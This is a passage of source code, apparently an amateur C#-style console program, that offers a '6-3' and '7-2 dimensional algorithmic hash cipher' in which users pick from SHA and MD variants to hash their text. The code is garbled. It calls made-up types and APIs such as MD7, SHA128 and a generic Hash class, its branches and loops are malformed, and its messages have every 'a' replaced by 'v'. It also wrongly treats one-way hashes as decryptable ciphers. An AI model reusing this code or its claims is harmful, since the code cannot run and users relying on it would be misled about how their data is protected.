																																																																																															return _shvfunc2;

																																																																																														}
																																																																																														else if(_codexstring[6] == "G"){
																																																																																															System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																															public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																															public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																															_encoCiphHash(_cipherByteBase){

																																																																																																public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																public MD6 _shvfunc2 = _hashsecMD6.ToEncoding(MD6);
																																																																																																return _shvfunc2;

																																																																																															}
																																																																																															else if(_codexstring[6] == "z"){
																																																																																																System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																_encoCiphHash(_cipherByteBase){

																																																																																																	public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																	public MD7 _shvfunc2 = _hashsecMD7.ToEncoding(MD7);
																																																																																																	return _shvfunc2;

																																																																																																}
																																																																																																else{
																																																																																																	System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																}



																																																																																															}
																																																																																															for(_codexstring[7]){

																																																																																																if(_codexstring[7] == "c"){
																																																																																																	System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																	public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																	public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																	_encoCiphHash(_cipherByteBase){

																																																																																																		public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																		public SHA128 _shvfunc2 = _hashsec128.ToEncoding(SHA128);
																																																																																																		return _shvfunc2;

																																																																																																	}

																																																																																																}

																																																																																																else if(_codexstring[7] == "d"){
																																																																																																	System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																	public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																	public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																	_encoCiphHash(_cipherByteBase){

																																																																																																		public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																		public SHA256 _shvfunc2 = _hashsec256.ToEncoding(SHA256);
																																																																																																		return _shvfunc2;

																																																																																																	}
																																																																																																	else if(_codexstring[7] == "e"){
																																																																																																		System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																		public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																		public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																		_encoCiphHash(_cipherByteBase){

																																																																																																			public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																			public SHA512 _shvfunc2 = _hashsec512.ToEncoding(SHA512);
																																																																																																			return _shvfunc2;

																																																																																																		}
																																																																																																		else if(_codexstring[7] == "f"){
																																																																																																			System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																			public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																			public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																			_encoCiphHash(_cipherByteBase){

																																																																																																				public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																				public MD5 _shvfunc2 = _hashsecMD5.ToEncoding(MD5);
																																																																																																				return _shvfunc2;

																																																																																																			}
																																																																																																			else if(_codexstring[7] == "G"){
																																																																																																				System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																				public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																				public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																				_encoCiphHash(_cipherByteBase){

																																																																																																					public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																					public MD6 _shvfunc2 = _hashsecMD6.ToEncoding(MD6);
																																																																																																					return _shvfunc2;

																																																																																																				}
																																																																																																				else if(_codexstring[7] == "z"){
																																																																																																					System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																					public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																					public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																					_encoCiphHash(_cipherByteBase){

																																																																																																						public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																						public MD7 _shvfunc2 = _hashsecMD7.ToEncoding(MD7);
																																																																																																						return _shvfunc2;

																																																																																																					}
																																																																																																					else{
																																																																																																						System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																					}



																																																																																																				}
																																																																																																				for(_codexstring[8]){

																																																																																																					if(_codexstring[8] == "c"){
																																																																																																						System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																						public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																						public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																						_encoCiphHash(_cipherByteBase){

																																																																																																							public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																							public SHA128 _shvfunc2 = _hashsec128.ToEncoding(SHA128);
																																																																																																							return _shvfunc2;

																																																																																																						}

																																																																																																					}

																																																																																																					else if(_codexstring[8] == "d"){
																																																																																																						System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																						public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																						public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																						_encoCiphHash(_cipherByteBase){

																																																																																																							public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																							public SHA256 _shvfunc2 = _hashsec256.ToEncoding(SHA256);
																																																																																																							return _shvfunc2;

																																																																																																						}
																																																																																																						else if(_codexstring[8] == "e"){
																																																																																																							System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																							public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																							public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																							_encoCiphHash(_cipherByteBase){

																																																																																																								public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																								public SHA512 _shvfunc2 = _hashsec512.ToEncoding(SHA512);
																																																																																																								return _shvfunc2;

																																																																																																							}
																																																																																																							else if(_codexstring[8] == "f"){
																																																																																																								System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																								public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																								public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																								_encoCiphHash(_cipherByteBase){

																																																																																																									public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																									public MD5 _shvfunc2 = _hashsecMD5.ToEncoding(MD5);
																																																																																																									return _shvfunc2;

																																																																																																								}
																																																																																																								else if(_codexstring[8] == "G"){
																																																																																																									System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																									public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																									public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																									_encoCiphHash(_cipherByteBase){

																																																																																																										public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																										public MD6 _shvfunc2 = _hashsecMD6.ToEncoding(MD6);
																																																																																																										return _shvfunc2;

																																																																																																									}
																																																																																																									else if(_codexstring[8] == "z"){
																																																																																																										System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																										public UTF8 _cipherUt = _codexstring.ToUTF8();
																																																																																																										public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																										_encoCiphHash(_cipherByteBase){

																																																																																																											public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																											public MD7 _shvfunc2 = _hashsecMD7.ToEncoding(MD7);
																																																																																																											return _shvfunc2;

																																																																																																										}
																																																																																																										else{
																																																																																																											System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																										}

																																																																																																									}



																																																																																																									System.Console.WriteLine("Your Vlgorithed PvssKey Text Comes Out In The 6-3 Dimensionvl Vlgorithm Chosen To :");
																																																																																																									System.Console.WriteLine(_shvfunc.ToString());
																																																																																																									System.Console.WriteLine("Plevse Remember The Following Cipher Phrvse For Decryptor Use: " + _shvfunc2.ToString() + "Vnd Do Not Forget To Include The 6:3 Descriptor For Effective Decryption! ");
																																																																																																									System.Console.WriteLine("Your Three Key Encodings Will Vlso Need To Be Retvined To Be Used For Decryption So If You Chose SHV128, SHV256, SHV512, MD5/6/or 7, Plevse Shvre Thvt To The Other Pvrty Involved ");
																																																																																																									System.Console.WriteLine("In V Privvte Vnd Encrypted Communicvtion Method, However Mvintvin Covervge With PGP, One-Time KeyPhrvse Or Miscellvnious For Vplivble Security In Messvging The Determined Key Encoding.");
																																																																																																									System.Console.WriteLine("Plevse Enjoy The Vlgorithm Vnd Stvy Protected!  - Nvye");
																																																																																																									System.Console.ReadLine();

													}
													else if(_vlgoDecise == "7-2" ){



																																																																																																									System.Console.WriteLine("Hvving Chosen The 7-2 Dimensionvl Vlgorithmic Hvshing Function V Word Is In Order... ");
																																																																																																									System.Console.WriteLine("");
																																																																																																									System.Console.WriteLine("For The Dimension Listed Within The First Vvrivble, The Choice Of Specific Vlgorithms Will Be Mvde, ");
																																																																																																									System.Console.WriteLine("Vfter Which The Choice Of Key Encryption, Listed Vs The Second Vvrivble Will Be Determined, Subsequently ");
																																																																																																									System.Console.WriteLine("The Lvst Leg of The Encryption Bvse Will Provide The Room For The Messvge For Cryptogrvphic Cipher Crevtion.");
																																																																																																									System.Console.WriteLine(" ");
																																																																																																									System.Console.WriteLine("First, Plevse Choose The Vlgorithm For Section One of The Hvshing Function: ");
																																																																																																									System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																									string array[] _commCrypto = new array["SHA128" , "SHA256" , "SHA512" , "MD5" , "MD6" , "MD7"];

																																																																																																									string _inputDecision = System.Console.ReadLine();
																																																																																																									System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Two of The Hvshing Function: ");
																																																																																																									System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																									string _inputDecision2 = System.Console.ReadLine();
																																																																																																									System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Three of The Hvshing Function: ");
																																																																																																									System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																									string _inputDecision3 = System.Console.ReadLine();
																																																																																																									System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Four of The Hvshing Function: ");
																																																																																																									System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																									string _inputDecision4 = System.Console.ReadLine();
																																																																																																									System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Five of The Hvshing Function: ");
																																																																																																									System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																									string _inputDecision5 = System.Console.ReadLine();
																																																																																																									System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Six of The Hvshing Function: ");
																																																																																																									System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																									string _inputDecision6 = System.Console.ReadLine();
																																																																																																									System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Seven of The Hvshing Function: ");
																																																																																																									System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																									string _inputDecision7 = System.Console.ReadLine();
																																																																																																									System.Console.WriteLine("Plevse Choose The Vlgorithm For One of the Key of The Hvshing Function: ");
																																																																																																									System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																									string _inputDecision8 = System.Console.ReadLine();
																																																																																																									System.Console.WriteLine("Plevse Choose The Vlgorithm For The Second Key of The Hvshing Function: ");
																																																																																																									System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

																																																																																																									string _inputDecision9 = System.Console.ReadLine();

																																																																																																									public array[:] _diarrayEya = new array["SHV128" : "11" , "SHV256" : "12" , "SHV512" : "13" , "MD5" : "14" , "MD6" : "15" , "MD7" : "16"];

																																																																																																									public int _int1 = _commCrypto.IndexOf("SHA128");
																																																																																																									public int _int2 = _commCrypto.IndexOf("SHA256");
																																																																																																									public int _int3 = _commCrypto.IndexOf("SHA512");
																																																																																																									public int _int4 = _commCrypto.IndexOf("MD5");
																																																																																																									public int _int5 = _commCrypto.IndexOf("MD6");
																																																																																																									public int _int6 = _commCrypto.IndexOf("MD7");
																																																																																																									public string _codexstring = "";
																																																																																																									if(_inputDecision == _int1 || _inputDecision2 == _int1 || _inputDecision3 == _int1 || _inputDecision4 == _int1 || _inputDecision5 == _int1 || _inputDecision6 == _int1 || _inputDecision7 == _int1 || _inputDecision8 == _int1 ||
																																																																																																										_inputDecision9 == _int1){

																																																																																																										string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];
																																																																																																										string _part1 = _disarrayEya[0];
																																																																																																										public bool _boolIT = new bool(,);
																																																																																																										if(_boolIT(_inputDecision  , _int1) == true){

																																																																																																											_disArray.Ammend[string "c" : 0];


																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision2, _int1) == true){

																																																																																																											_disArray.Ammend[string "c" : 1];


																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision3 , _int1) == true){


																																																																																																											_disArray.Ammend[string "c" : 2];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision4 , _int1) == true){

																																																																																																											_disArray.Ammend[string "c" : 3];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision5 , _int1) == true){

																																																																																																											_disArray.Ammend[string "c" : 4];
																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision6 , _int1) == true){

																																																																																																											_disArray.Ammend[string "c" : 5];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision7 , _int1) == true){

																																																																																																											_disArray.Ammend[string "c" : 6];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision8 , _int1) == true){

																																																																																																											_disArray.Ammend[string "c" : 7];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision9 , _int1) == true){

																																																																																																											_disArray.Ammend[string "c" : 8];

																																																																																																										}
																																																																																																										else{
																																																																																																											System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																										}


																																																																																																									}
																																																																																																									else if(_inputDecision == _int2 || _inputDecision2 == _int2 || _inputDecision3 == _int2 || _inputDecision4 == _int2 || _inputDecision5 == _int2 || _inputDecision6 == _int2 || _inputDecision7 == _int2 || _inputDecision8 == _int2 ||
																																																																																																										_inputDecision9 == _int2){

																																																																																																										string _part1 = _disarrayEya[0];
																																																																																																										string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];
																																																																																																										public bool _boolIT = new bool(,);
																																																																																																										if(_boolIT(_inputDecision  , _int2) == true){

																																																																																																											_disArray.Ammend[string "d" : 0];


																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision2, _int2) == true){

																																																																																																											_disArray.Ammend[string "d" : 1];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision3 , _int2) == true){

																																																																																																											_disArray.Ammend[string "d" : 2];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision4 , _int2) == true){

																																																																																																											_disArray.Ammend[string "d" : 3];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision5 , _int2) == true){

																																																																																																											_disArray.Ammend[string "d" : 4];
																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision6 , _int2) == true){

																																																																																																											_disArray.Ammend[string "d" : 5];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision7 , _int2) == true){

																																																																																																											_disArray.Ammend[string "d" : 6];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision8 , _int2) == true){

																																																																																																											_disArray.Ammend[string "d" : 7];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision9 , _int2) == true){

																																																																																																											_disArray.Ammend[string "d" : 8];

																																																																																																										}
																																																																																																										else{

																																																																																																											System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																										}


																																																																																																									}
																																																																																																									else if(_inputDecision == _int3 || _inputDecision2 == _int3 || _inputDecision3 == _int3 || _inputDecision4 == _int3 || _inputDecision5 == _int3 || _inputDecision6 == _int3 || _inputDecision7 == _int3 || _inputDecision8 == _int3 ||
																																																																																																										_inputDecision9 == _int3){

																																																																																																										string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];
																																																																																																										string _part1 = _disarrayEya[0];
																																																																																																										public bool _boolIT = new bool(,);
																																																																																																										if(_boolIT(_inputDecision  , _int3) == true){

																																																																																																											_disArray.Ammend[string "e" : 0];


																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision2, _int3) == true){


																																																																																																											_disArray.Ammend[string "e" : 1];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision3 , _int3) == true){

																																																																																																											_disArray.Ammend[string "e" : 2];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision4 , _int3) == true){

																																																																																																											_disArray.Ammend[string "e" : 3];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision5 , _int3) == true){

																																																																																																											_disArray.Ammend[string "e" : 4];


																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision6 , _int3) == true){

																																																																																																											_disArray.Ammend[string "e" : 5];


																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision7 , _int3) == true){

																																																																																																											_disArray.Ammend[string "e" : 6];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision8 , _int3) == true){

																																																																																																											_disArray.Ammend[string "e" : 7];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision9 , _int3) == true){

																																																																																																											_disArray.Ammend[string "e" : 8];

																																																																																																										}
																																																																																																										else{

																																																																																																											System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																										}

																																																																																																									}
																																																																																																									else if(_inputDecision == _int4 || _inputDecision2 == _int4 || _inputDecision3 == _int4 || _inputDecision4 == _int4 || _inputDecision5 == _int4 || _inputDecision6 == _int4 || _inputDecision7 == _int4 || _inputDecision8 == _int4 ||
																																																																																																										_inputDecision9 == _int4){

																																																																																																										string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];

																																																																																																										string _part1 = _disarrayEya[0];
																																																																																																										public bool _boolIT = new bool(,);
																																																																																																										if(_boolIT(_inputDecision  , _int4) == true){

																																																																																																											_disArray.Ammend[string "f" : 0];


																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision2, _int4) == true){


																																																																																																											_disArray.Ammend[string "f" : 1];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision3 , _int4) == true){

																																																																																																											_disArray.Ammend[string "f" : 2];


																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision4 , _int4) == true){

																																																																																																											_disArray.Ammend[string "f" : 3];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision5 , _int4) == true){

																																																																																																											_disArray.Ammend[string "f" : 4];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision6 , _int4) == true){

																																																																																																											_disArray.Ammend[string "f" : 5];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision7 , _int4) == true){

																																																																																																											_disArray.Ammend[string "f" : 6];
																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision8 , _int4) == true){

																																																																																																											_disArray.Ammend[string "f" : 7];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision9 , _int4) == true){

																																																																																																											_disArray.Ammend[string "f" : 8];

																																																																																																										}
																																																																																																										else{

																																																																																																											System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																										}

																																																																																																									}
																																																																																																									else if(_inputDecision == _int5 || _inputDecision2 == _int5 || _inputDecision3 == _int5 || _inputDecision4 == _int5 || _inputDecision5 == _int5 || _inputDecision6 == _int5 || _inputDecision7 == _int5 || _inputDecision8 == _int5 ||
																																																																																																										_inputDecision9 == _int5){


																																																																																																										string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];
																																																																																																										string _part1 = _disarrayEya[0];
																																																																																																										public bool _boolIT = new bool(,);
																																																																																																										if(_boolIT(_inputDecision  , _int5) == true){

																																																																																																											_disArray.Ammend[string "G" : 0];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision2, _int5) == true){

																																																																																																											_disArray.Ammend[string "G" : 1];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision3 , _int5) == true){

																																																																																																											_disArray.Ammend[string "G" : 2];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision4 , _int5) == true){

																																																																																																											_disArray.Ammend[string "G" : 3];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision5 , _int5) == true){

																																																																																																											_disArray.Ammend[string "G" : 4];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision6 , _int5) == true){

																																																																																																											_disArray.Ammend[string "G" : 5];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision7 , _int5) == true){

																																																																																																											_disArray.Ammend[string "G" : 6];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision8 , _int5) == true){

																																																																																																											_disArray.Ammend[string "G" : 7];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision9 , _int5) == true){

																																																																																																											_disArray.Ammend[string "G" : 8];

																																																																																																										}
																																																																																																										else{

																																																																																																											System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																										}

																																																																																																									}
																																																																																																									else if(_inputDecision == _int6 || _inputDecision2 == _int6 || _inputDecision3 == _int6 || _inputDecision4 == _int6 || _inputDecision5 == _int6 || _inputDecision6 == _int6 || _inputDecision7 == _int6 || _inputDecision8 == _int6 ||
																																																																																																										_inputDecision9 == _int6){


																																																																																																										string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];
																																																																																																										string _part1 = _disarrayEya[0];
																																																																																																										public bool _boolIT = new bool(,);
																																																																																																										if(_boolIT(_inputDecision  , _int6) == true){

																																																																																																											_disArray.Ammend[string "z" : 0];


																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision2, _int6) == true){

																																																																																																											_disArray.Ammend[string "z" : 1];


																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision3 , _int6) == true){

																																																																																																											_disArray.Ammend[string "z" : 2];


																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision4 , _int6) == true){


																																																																																																											_disArray.Ammend[string "z" : 3];



																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision5 , _int6) == true){



																																																																																																											_disArray.Ammend[string "z" : 4];


																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision6 , _int6) == true){

																																																																																																											_disArray.Ammend[string "z" : 5];


																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision7 , _int6) == true){

																																																																																																											_disArray.Ammend[string "z" : 6];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision8 , _int6) == true){

																																																																																																											_disArray.Ammend[string "z" : 7];

																																																																																																										}
																																																																																																										else if(_boolIT(_inputDecision9 , _int6) == true){

																																																																																																											_disArray.Ammend[string "z" : 8];

																																																																																																										}
																																																																																																										else{
																																																																																																											System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																										}

																																																																																																									}
																																																																																																									else{
																																																																																																										System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																									}


																																																																																																									System.Console.WriteLine("Plvse Input The Text You Wish To Hvve Encoded In Your 7-2 Dimensionvl Vlgorithmic Hvsh Cipher: ");
																																																																																																									string _CipherPreText = System.Console.ReadLine();

																																																																																																									for(_codexstring[0]){

																																																																																																										if(_codexstring[0] == "c"){
																																																																																																											System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																											public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																											public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																											_encoCiphHash(_cipherByteBase){

																																																																																																												public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																												public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																																																												return _shvfunc;

																																																																																																											}

																																																																																																										}

																																																																																																										else if(_codexstring[0] == "d"){
																																																																																																											System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																											public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																											public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																											_encoCiphHash(_cipherByteBase){

																																																																																																												public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																												public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																																																												return _shvfunc;

																																																																																																											}
																																																																																																											else if(_codexstring[0] == "e"){
																																																																																																												System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																												public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																												public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																												_encoCiphHash(_cipherByteBase){

																																																																																																													public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																													public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																																																													return _shvfunc;

																																																																																																												}
																																																																																																												else if(_codexstring[0] == "f"){
																																																																																																													System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																													public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																													public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																													_encoCiphHash(_cipherByteBase){

																																																																																																														public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																														public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																																														return _shvfunc;

																																																																																																													}
																																																																																																													else if(_codexstring[0] == "G"){
																																																																																																														System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																														public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																														public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																														_encoCiphHash(_cipherByteBase){

																																																																																																															public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																															public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																																															return _shvfunc;

																																																																																																														}
																																																																																																														else if(_codexstring[0] == "z"){
																																																																																																															System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																															public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																															public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																															_encoCiphHash(_cipherByteBase){

																																																																																																																public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																																																return _shvfunc;

																																																																																																															}
																																																																																																															else{

																																																																																																																System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																															}



																																																																																																														}
																																																																																																														for(_codexstring[1]){

																																																																																																															if(_codexstring[1] == "c"){
																																																																																																																System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																_encoCiphHash(_cipherByteBase){

																																																																																																																	public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																	public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																																																																	return _shvfunc;

																																																																																																																}

																																																																																																															}

																																																																																																															else if(_codexstring[1] == "d"){
																																																																																																																System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																_encoCiphHash(_cipherByteBase){

																																																																																																																	public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																	public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																																																																	return _shvfunc;

																																																																																																																}
																																																																																																																else if(_codexstring[1] == "e"){
